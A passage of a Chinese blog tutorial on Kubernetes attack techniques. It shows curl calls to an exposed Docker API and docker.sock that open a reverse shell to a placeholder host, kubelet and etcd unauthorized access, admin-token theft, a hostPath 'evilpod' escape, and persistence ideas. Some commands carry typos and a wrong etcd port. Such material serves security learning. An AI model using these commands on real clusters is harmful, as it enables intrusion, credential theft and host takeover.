<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://ip:2375/containers/&#123;container_id&#125;/exec&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&#x27;&#123;&quot;Cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&quot;]&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获取到一个id</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021508.png"></p>
<p>然后请求这个id,执行此命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://ip:2375/exec/&#123;id&#125;/start&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就像这样：（图片引用自freebuf）</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021507.png"></p>
<h4 id="直接利用现成的docker-sock"><a href="#直接利用现成的docker-sock" class="headerlink" title="直接利用现成的docker.sock"></a>直接利用现成的docker.sock</h4><p>如果我们入侵了一个docker容器，这个docker容器里面有docker.sock(常用路径/var/run/docker.sock)，那么就可以直接利用此文件控制docker daemon。</p>
<p>把上一小节的命令改改就行，加一个—unix-socket参数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -s --unix-socket /<span class="keyword">var</span>/run/docker.sock -X POST <span class="string">&quot;http://docker_daemon_ip/containers/&#123;container_id&#125;/exec&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&#x27;&#123;&quot;Cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&quot;]&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -s --unix-socket /<span class="keyword">var</span>/run/docker.sock -X POST <span class="string">&quot;http://docker_daemon_ip/exec/&#123;id&#125;/start&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一般来说docker.sock是存在于docker daemon服务端的，但如果开发人员想在docker容器里运行docker命令，就需要把宿主机的docker.sock挂载到容器内部了，这就给了我们docker逃逸的可乘之机。</p>
<h3 id="kubelet-未授权"><a href="#kubelet-未授权" class="headerlink" title="kubelet 未授权"></a>kubelet 未授权</h3><p>kubelet和kubectl的区别？</p>
<p>kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021509.png"></p>
<p>kubelet对应的API端口默认在10250，运行在集群中每台Node上，kubelet 的配置文件在node上的/var/lib/kubelet/config.yaml<br>我们重点关注配置文件中的这两个选项：第一个选项用于设置kubelet api能否被匿名访问，第二个选项用于设置kubelet api访问是否需要经过Api server进行授权（这样即使匿名⽤户能够访问也不具备任何权限）。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021510.png"></p>
<p>在默认情况下，kubelet配置文件就如上图所示，我们直接访问kubelet对应API端口会显示认证不通过</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021511.png"></p>
<p>我们将配置文件中，authentication-anonymous-enabled改为true，authorization-mode改为AlwaysAllow，再使用命令systemctl restart kubelet 重启kubelet，那么就可以实现kubelet未授权访问</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021512.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">关于authorization-mode还有以下的配置</span><br><span class="line">--authorization-mode=ABAC 基于属性的访问控制（ABAC）模式允许你 使用本地文件配置策略。</span><br><span class="line">--authorization-mode=RBAC 基于角色的访问控制（RBAC）模式允许你使用 Kubernetes API 创建和存储策略。</span><br><span class="line">--authorization-mode=Webhook WebHook 是一种 HTTP 回调模式，允许你使用远程 REST 端点管理鉴权。</span><br><span class="line">--authorization-mode=Node 节点鉴权是一种特殊用途的鉴权模式，专门对 kubelet 发出的 API 请求执行鉴权。</span><br><span class="line">--authorization-mode=AlwaysDeny 该标志阻止所有请求。仅将此标志用于测试。</span><br><span class="line">--authorization-mode=AlwaysAllow 此标志允许所有请求。仅在你不需要 API 请求 的鉴权时才使用此标志。</span><br></pre></td></tr></table></figure>

<p>在我们发现kubelet未授权后，可以进行以下操作拿到入口点</p>
<h4 id="执行Pod内命令"><a href="#执行Pod内命令" class="headerlink" title="执行Pod内命令"></a>执行Pod内命令</h4><p>如果有kubelet未授权，那就可以用以下命令在Pod内执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -XPOST -k https:<span class="comment">//node_ip:10250/run/&lt;namespace&gt;/&lt;PodName&gt;/&lt;containerName&gt; -d &quot;cmd=command&quot;</span></span><br></pre></td></tr></table></figure>

<p>其中的参数可以从<a target="_blank" rel="noopener" href="https://node_ip:10250/pods">https://node_ip:10250/pods</a> 中获取</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021513.png"></p>
<p>可以直接回显命令结果，很方便</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021514.png"></p>
<h4 id="获取容器内service-account凭据"><a href="#获取容器内service-account凭据" class="headerlink" title="获取容器内service account凭据"></a>获取容器内service account凭据</h4><p>如果能在Pod内执行命令，那么就可以获取Pod里service account的凭据，使用Pod上的service account凭据可以用来模拟Pod上的服务账户进行操作，具体利用方法见下面的小节。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021515.png"></p>
<h3 id="etcd-未授权"><a href="#etcd-未授权" class="headerlink" title="etcd 未授权"></a>etcd 未授权</h3><p>etcd是k8s集群中的数据库组件，默认监听在2379端口，如果2379存在未授权，那么就可以通过etcd查询集群内管理员的token，然后用这个token访问api server接管集群。</p>
<p>etcd有v2和v3两个版本，k8s用的是v3版本，所以我们在访问etcd的时候需要用命令ETCDCTL_API=3来指定etcd版本。</p>
<p>我们想要利用etcd未授权，需要使用一个工具叫做etcdctl，它是用来管理etcd数据库的，我们可以在github上下载它</p>
<p><a target="_blank" rel="noopener" href="https://github.com/etcd-io/etcd/releases/">https://github.com/etcd-io/etcd/releases/</a></p>
<p>“在启动etcd时，如果没有指定 –client-cert-auth 参数打开证书校验，并且没有通过iptables / 防火墙等实施访问控制，etcd的接口和数据就会直接暴露给外部黑客”——爱奇艺安全应急响应中心</p>
<p>复现环境我也懒得搭了，我们就在授权情况下来复现这个洞吧！（</p>
<p>首先，如果我们在没有证书文件的前提下直接访问2375端口，是调用不了etcd应用的,会提示X509证书错误。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ETCDCTL_API=<span class="number">3</span> ./etcdctl --endpoints=https:<span class="comment">//etcd_ip:2375/ get / --prefix --keys-only</span></span><br></pre></td></tr></table></figure>

<p>我们需要将以下文件加入环境变量才能访问（如果有未授权，那么不用带证书都能访问）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/peer.crt</span><br><span class="line">export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt</span><br><span class="line">export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/peer.key</span><br></pre></td></tr></table></figure>

<h4 id="查询管理员token"><a href="#查询管理员token" class="headerlink" title="查询管理员token"></a>查询管理员token</h4><p>图片引用自爱奇艺安全应急响应中心</p>
<p>我们可以直接在etcd里查询管理员的token，然后使用该token配合kubectl指令接管集群。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">etcdctl --endpoints=https:<span class="comment">//etcd_ip:2375/ get / --prefix --keys-only | grep /secrets/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021517.png"></p>
<p>如果查询结果有敏感账户，我们便可以去获取他的token</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">etdctl --endpoints=https:<span class="comment">//etcd_ip:2375/ get /registry/secrets/default/admin-token-55712</span></span><br></pre></td></tr></table></figure>

<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021516.png"></p>
<p>拿到token以后，用kubectl接管集群</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl --insecure-skip-tls-verify -s https:<span class="comment">//master_ip:6443/ --token=&quot;xxxxxx&quot; get nodes</span></span><br></pre></td></tr></table></figure>

<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><h3 id="目录挂载逃逸"><a href="#目录挂载逃逸" class="headerlink" title="*目录挂载逃逸"></a>*目录挂载逃逸</h3><p>这个技术是综合了执行、持久化、权限提升的一个攻击方法，为了省事，就放在这里一块说了。</p>
<p>首先，在我们获取了api server控制权后，我们可以创建Pod，并在容Pod内部执行命令。如果我们在创建Pod时，将Node节点的根目录挂载到Pod的某个目录下，由于我们能在Pod内部执行命令，所以我们可以修改挂载到Pod下的Node节点根目录中文件的内容，如果我们写入恶意crontab、web shell、ssh公钥，便可以从Pod逃逸到宿主机Node，获取Node控制权。</p>
<p>具体复现如下</p>
<p>先创建一个恶意Pod</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">首先我们创建恶意Pod，可以直接创建Pod，也可以用Deployment创建。</span><br><span class="line">既然提到创建Pod，那么就多提一句：直接创建Pod和用Deployment创建Pod的区别是什么？</span><br><span class="line"></span><br><span class="line">Deployment可以更方便的设置Pod的数量，方便Pod水平扩展。</span><br><span class="line">Deployment拥有更加灵活强大的升级、回滚功能,并且支持滚动更新。</span><br><span class="line">使用Deployment升级Pod只需要定义Pod的最终状态，k8s会为你执行必要的操作。</span><br><span class="line"></span><br><span class="line">如果创建一个小玩意，那么直接创建Pod就行了，没必要用deployment。</span><br><span class="line">_______________________________________</span><br><span class="line">用Pod创建</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: evilpod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: nginx</span><br><span class="line">    name: container</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /mnt</span><br><span class="line">      name: test-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: test-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      </span><br><span class="line">__________________________________</span><br><span class="line">用deployment创建</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx-test</span><br><span class="line">spec:</span><br><span class="line">  replicas: <span class="number">1</span></span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - image: nginx</span><br><span class="line">        name: container</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /mnt</span><br><span class="line">          name: test-volume</span><br><span class="line">      volumes:</span><br><span class="line">      - name: test-volume</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将以上文本写入到一个yaml文件中，然后执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl apply -f xxxxx.yaml</span><br><span class="line">如果是api server未授权打进去的，可能要通过-s参数设置一下api server的ip和地址：kubectl -s http:<span class="comment">//master_ip:8080 command</span></span><br><span class="line"></span><br><span class="line">这里再多嘴一句 kubectl apply 和 kubectl create 这两个命令的区别</span><br><span class="line">两个命令都可以用于创建pod，apply更倾向于”维护资源“，可以用于更新已有Pod；而create更倾向于”直接创建“，不管三七二十一给我创建就完事了</span><br><span class="line">简而言之，当一个资源已经存在时，用create会报错，而apply不会报错</span><br><span class="line">——————ref:https:<span class="comment">//stackoverflow.com/questions/47369351/kubectl-apply-vs-kubectl-create</span></span><br></pre></td></tr></table></figure>

<p>恶意容器就创建好了</p>
<p>创建好了后使用命令 kubectl get pods 获取恶意pod的名字</p>
<p>然后使用命令 kubectl exec -it evilpodname /bin/bash 进入pod内部shell，然后向挂载到Pod内部的Node根目录中写入恶意crontab、ssh公钥、webshell即可拿到node的shell。</p>
<p>大致流程一张图表示如下</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115842.png" alt="image-20220311115835649"></p>
<h3 id="利用Service-Account连接API-Server执行指令"><a href="#利用Service-Account连接API-Server执行指令" class="headerlink" title="利用Service Account连接API Server执行指令"></a>利用Service Account连接API Server执行指令</h3><p>k8s有两种账户：用户账户和服务账户，用户账户被用于人与集群交互（如管理员管理集群），服务账户用于Pod与集群交互（如Pod调用api server提供的一些API进行一些活动）</p>
<p>如果我们入侵了一台有着高权限服务账户的Pod，我们就可以用它对应的服务账户身份调用api server向集群下达命令。<br>pod的serviceaccount信息一般存放于/var/run/secrets/kubernetes.io/serviceaccount/目录下</p>
<p>但是默认的user或者service account并不具备任何权限</p>
<p>这是默认情况下，一个pod使用自身service account(默认为当前命名空间的default账户)去请求api server返回的结果，可以发现是没有权限的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ CA_CERT=/<span class="keyword">var</span>/run/secrets/kubernetes.io/serviceaccount/ca.crt</span><br><span class="line">$ TOKEN=$(cat /<span class="keyword">var</span>/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">$ NAMESPACE=$(cat /<span class="keyword">var</span>/run/secrets/kubernetes.io/serviceaccount/namespace)</span><br><span class="line">$ curl --cacert $CA_CERT -H <span class="string">&quot;Authorization: Bearer $TOKEN&quot;</span> <span class="string">&quot;https://192.168.111.20:6443/version/&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Status&quot;</span>,</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;status&quot;</span>: <span class="string">&quot;Failure&quot;</span>,</span><br><span class="line">  <span class="string">&quot;message&quot;</span>: <span class="string">&quot;version is forbidden: User \&quot;system:serviceaccount:default:default\&quot; cannot list resource \&quot;version\&quot; in API group \&quot;\&quot; at the cluster scope&quot;</span>,</span><br><span class="line">  <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;Forbidden&quot;</span>,</span><br><span class="line">  <span class="string">&quot;details&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;version&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;code&quot;</span>: <span class="number">403</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>那么我现在创建一个高权限service account 并使其与一个Pod相关联，来复现一下这个攻击手法</p>
<p>首先创建一个高权限service account </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl create serviceaccount niubi #创建service account：niubi</span><br><span class="line">kubectl create clusterrolebinding cluster-admin-niubi  --clusterrole=cluster-admin --serviceaccount=default:niubi #把niubi放入集群管理员组，相当于给了它高权限</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后将service account与pod相关联</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">在创建Pod的yaml文件中的spec项中输入 serviceAccountName: niubi</span><br></pre></td></tr></table></figure>

<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115857.png" alt="image-20220311115857358"></p>
<p>再试一下，发现可以调用api server了</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115913.png" alt="image-20220311115913661"></p>
<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>这里的持久化是指如何在Pod中持久化、如何在Node中持久化、如何在集群中持久化。<br>如何在Node中持久化，在上一小节中已经提到过一些：通过写入crontab，ssh公钥，webshell实现，但个人觉得这几个手段与其说是持久化，不如说是权限提升更符合实际一点，因为这几个手段在实际渗透中都是为了从Pod逃逸出来获取Node权限。</p>
<p>同时，在Pod，Node，Master上做持久化，有大部分方法本质上是“如何在linux机器上做持久化”，而“如何在linux机器上做持久化”方法就太多了，这里就只着重于讲述在“云环境”里独有的持久化方法。</p>
<h4 id="在私有镜像库中植入后门（Pod持久化）"><a href="#在私有镜像库中植入后门（Pod持久化）" class="headerlink" title="在私有镜像库中植入后门（Pod持久化）"></a>在私有镜像库中植入后门（Pod持久化）</h4><p>如果接管了对方的私有镜像库，我们便可以直接在其对象Dockerfile中塞入恶意指令（反弹shell等）<br>或者编辑镜像的文件层代码，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像。</p>
<h4 id="修改核心组件访问权限（集群持久化）"><a href="#修改核心组件访问权限（集群持久化）" class="headerlink" title="修改核心组件访问权限（集群持久化）"></a>修改核心组件访问权限（集群持久化）</h4><p>包括且不限于 更改配置暴露apiserver 8080端口、暴露docker.sock、暴露未授权etcd、暴露未授权kubelet等修改集群配置文件达到持久化的方法。</p>
<h4 id="shadow-api-server（集群持久化-cdk工具利用）"><a href="#shadow-api-server（集群持久化-cdk工具利用）" class="headerlink" title="shadow api server（集群持久化/cdk工具利用）"></a>shadow api server（集群持久化/cdk工具利用）</h4><p>部署一个额外的未授权且不记录日志的api server以供我们进行持久化。</p>
<p>我们可以用github上专门用于k8s渗透的工具cdk（这个工具很屌）来做到这一点</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">https://github.com/cdk-team/CDK/wiki/CDK-Home-CN</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver">https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver</a></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>指从pod拿到Node的shell，或者拿到集群控制权。</p>
<p>上面的小节提到过一些，比如kubectl未授权、docker.sock、挂载目录、高权限Service account等方法。</p>
<p>除此之外还有Docker、k8s的一些CVE</p>
<p>Docker逃逸如CVE-2019-5736，CVE-2019-14271,CVE-2020-15257</p>
<p>k8s提权到接管集群的如CVE-2018-1002105,CVE-2020-8558</p>
<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><h3 id="是否在容器环境中"><a href="#是否在容器环境中" class="headerlink" title="是否在容器环境中"></a>是否在容器环境中</h3><ul>
<li>根目录下/.dockerenv 文件存在即docker环境</li>
<li>/proc/1/cgroup 内若包含docker或kube字符串则是在docker环境或k8s pod 之中</li>
</ul>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220311115944.png" alt="image-20220311115944024"></p>
<ul>
<li>没有常见命令</li>
</ul>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021522.png"></p>
<ul>
<li>查看环境变量中是否有k8s或者docker字符串</li>
</ul>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021524.png"></p>
<ul>
<li>查看端口开放情况（netstat -anp），如果开放了一些特殊端口如6443、8080（api server）,2379（etcd）,10250、10255（kubelet），10256（kube-proxy） 那么可以初步判定为是在k8s环境中的一台Node或者master，这个方法亦可用于端口扫描探测目标主机是否为k8s集群中的机器</li>
<li>查看当前网段，k8s中 Flannel网络插件默认使用10.244.0.0/16网络，Calico默认使用192.168.0.0/16网络，如果出现在这些网段中（特别是10.244网段）那么可以初步判断为集群中的一个pod。pod里面没有命令很少，可以通过hostname -I(大写i)来查看ip地址</li>
</ul>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021523.png"></p>
<h1 id="0x04-ref"><a href="#0x04-ref" class="headerlink" title="#0x04 ref"></a>#0x04 ref</h1><p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/765449#slide-5">https://developer.aliyun.com/article/765449#slide-5</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4276#toc-4">https://xz.aliyun.com/t/4276#toc-4</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1389/">https://tttang.com/archive/1389/</a></p>
<p><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2021-07-20/1/">https://payloads.online/archivers/2021-07-20/1/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/316788.html">https://www.freebuf.com/articles/database/316788.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/196993.html">https://www.freebuf.com/vuls/196993.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/pen4uin/cloud-native-security">https://github.com/pen4uin/cloud-native-security</a></p>
<p><a target="_blank" rel="noopener" href="https://www.updateweb.cn/zwfec/item-367.html">https://www.updateweb.cn/zwfec/item-367.html</a></p>
<p><a target="_blank" rel="noopener" href="https://kuboard.cn/learning/">https://kuboard.cn/learning/</a>(非常好的中文教程)</p>
<p><a target="_blank" rel="noopener" href="https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/">https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/</a>(k8s官方教程，有交互式操作界面，稍微有点不好的是有些地方没有中文)</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ConsT27</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://const27.com/2022/03/13/k8s%E5%AE%89%E5%85%A8%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/">http://const27.com/2022/03/13/k8s%E5%AE%89%E5%85%A8%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://const27.com" target="_blank">ConsT27's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BA%91%E7%9B%B8%E5%85%B3/">云相关</a></div><div class="post_share"><div class="social-share" data-image="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bd.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" target="_blank"><img class="post-qr-code-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/mm_facetoface_collect_qrcode_1613729678854.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/27/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/"><img class="prev-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/co.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2022/03/02/C3P0%E9%93%BE/"><img class="next-cover" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bo.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析C3P0链</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#k8s%E5%AE%89%E5%85%A8-%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">k8s安全 入门学习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E4%BA%91"><span class="toc-number">2.</span> <span class="toc-text">#0x01云</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E4%BD%95%E4%B8%BAk8s-%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">#0x02 何为k8s ？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#K8S-%E6%9E%B6%E6%9E%84%E7%AE%80%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">K8S 架构简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BAK8S"><span class="toc-number">3.2.</span> <span class="toc-text">搭建K8S</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K8S%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">3.3.</span> <span class="toc-text">K8S的基础概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2%E2%80%94%E2%80%94Deployment"><span class="toc-number">3.3.1.</span> <span class="toc-text">部署——Deployment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POD%E4%B8%8ENode"><span class="toc-number">3.3.2.</span> <span class="toc-text">POD与Node</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E2%80%94%E2%80%94Service"><span class="toc-number">3.3.3.</span> <span class="toc-text">服务——Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%B8%E7%BC%A9%E2%80%94%E2%80%94Scaling"><span class="toc-number">3.3.4.</span> <span class="toc-text">伸缩——Scaling</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%9A%E5%8A%A8%E6%9B%B4%E6%96%B0%E2%80%94%E2%80%94Rolling-Update"><span class="toc-number">3.3.5.</span> <span class="toc-text">滚动更新——Rolling Update</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-K8S%E5%AE%89%E5%85%A8"><span class="toc-number">4.</span> <span class="toc-text">#0x03 K8S安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-number">4.1.</span> <span class="toc-text">初始访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E8%B4%A6%E5%8F%B7AK%E6%B3%84%E9%9C%B2"><span class="toc-number">4.1.1.</span> <span class="toc-text">云账号AK泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E9%95%9C%E5%83%8F"><span class="toc-number">4.1.2.</span> <span class="toc-text">恶意镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-Server%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.1.3.</span> <span class="toc-text">API Server未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#insecure-port-%E5%BC%80%E5%90%AF"><span class="toc-number">4.1.3.1.</span> <span class="toc-text">insecure-port 开启</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#secure-port-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">4.1.3.2.</span> <span class="toc-text">secure-port 配置错误</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#configfile-%E6%B3%84%E9%9C%B2"><span class="toc-number">4.1.4.</span> <span class="toc-text">configfile 泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E5%86%85%E9%83%A8%E5%BA%94%E7%94%A8%E5%85%A5%E4%BE%B5"><span class="toc-number">4.1.5.</span> <span class="toc-text">容器内部应用入侵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E5%BA%93%E6%9A%B4%E9%9C%B2"><span class="toc-number">4.1.6.</span> <span class="toc-text">私有镜像库暴露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-sock-%E5%88%A9%E7%94%A8"><span class="toc-number">4.1.7.</span> <span class="toc-text">docker.sock  利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%9A%B4%E9%9C%B2"><span class="toc-number">4.1.7.1.</span> <span class="toc-text">公网暴露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E7%8E%B0%E6%88%90%E7%9A%84docker-sock"><span class="toc-number">4.1.7.2.</span> <span class="toc-text">直接利用现成的docker.sock</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 